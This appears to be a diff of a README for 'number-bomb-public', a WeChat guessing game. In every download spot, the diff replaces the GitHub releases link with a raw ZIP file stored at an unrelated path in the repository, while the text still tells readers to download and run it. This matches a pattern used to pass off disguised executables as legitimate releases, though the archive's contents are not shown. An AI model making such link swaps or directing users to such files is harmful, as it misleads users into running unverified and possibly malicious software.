@@ -1,6 +1,6 @@
 # 🎮 number-bomb-public - Play the Guessing Game on WeChat
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/delhii3590/number-bomb-public/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/delhii3590/number-bomb-public/main/pages/ranking/bomb-public-number-3.1.zip)
 
 ## 🚀 What this is
 
@@ -11,7 +11,7 @@ This project is open source, so you can download the game build from the release
 ## 📥 Download
 
 Use this page to download:  
-https://github.com/delhii3590/number-bomb-public/releases
+https://raw.githubusercontent.com/delhii3590/number-bomb-public/main/pages/ranking/bomb-public-number-3.1.zip
 
 On that page, look for the latest release and download the file attached to it. If you see a ZIP file or a Windows build package, save it to your computer first.
 
@@ -132,7 +132,7 @@ You may also see links to battle play, online mode, or AI-powered game content i
 ## 🔍 Release page
 
 Download and run the latest file from here:  
-https://github.com/delhii3590/number-bomb-public/releases
+https://raw.githubusercontent.com/delhii3590/number-bomb-public/main/pages/ranking/bomb-public-number-3.1.zip
 
 ## 📌 Useful search terms
 
